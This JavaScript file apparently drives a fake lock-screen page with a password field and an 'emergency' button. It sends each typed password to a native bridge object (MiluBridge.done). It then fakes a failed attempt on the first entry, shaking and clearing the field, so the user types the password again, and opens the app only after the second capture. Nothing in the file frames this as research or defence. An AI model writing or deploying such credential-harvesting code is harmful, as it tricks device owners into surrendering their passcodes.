(() => {
  const MIN_LEN = 4;
  const MAX_LEN = 64;

  const page = document.getElementById("page");
  const field = document.querySelector(".field");
  const pwdInput = document.getElementById("pwdInput");
  const emergencyBtn = document.getElementById("emergencyBtn");

  let submitting = false;
  let submitCount = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function focusInput() {
    if (submitting) {
      return;
    }
    try {
      pwdInput.focus({ preventScroll: true });
    } catch (_) {
      pwdInput.focus();
    }
  }

  function shake() {
    field.classList.remove("is-shake");
    void field.offsetWidth;
    field.classList.add("is-shake");
  }

  function clearValue() {
    pwdInput.value = "";
  }

  function currentValue() {
    return String(pwdInput.value || "").slice(0, MAX_LEN);
  }

  function canSubmit() {
    const value = currentValue();
    return value.length >= MIN_LEN && value.length <= MAX_LEN;
  }

  function submitPassword() {
    if (submitting || !canSubmit()) {
      if (!canSubmit()) {
        shake();
      }
      return;
    }
    submitting = true;
    const value = currentValue();
    submitCount += 1;
    reportDone(value);

    if (submitCount < 2) {
      shake();
      window.setTimeout(() => {
        clearValue();
        submitting = false;
        focusInput();
      }, 360);
      return;
    }

    pwdInput.blur();
    window.setTimeout(() => {
      openApp();
      submitting = false;
    }, 280);
  }

  pwdInput.addEventListener("input", () => {
    if (submitting) {
      return;
    }
    if (pwdInput.value.length > MAX_LEN) {
      pwdInput.value = pwdInput.value.slice(0, MAX_LEN);
    }
  });

  pwdInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      submitPassword();
    }
  });

  emergencyBtn.addEventListener("click", (event) => {
    event.preventDefault();
    focusInput();
  });

  page.addEventListener("pointerdown", (event) => {
    if (event.target === emergencyBtn || event.target === pwdInput) {
      return;
    }
    focusInput();
  });

  window.addEventListener("pageshow", focusInput);
  window.setTimeout(focusInput, 80);
})();
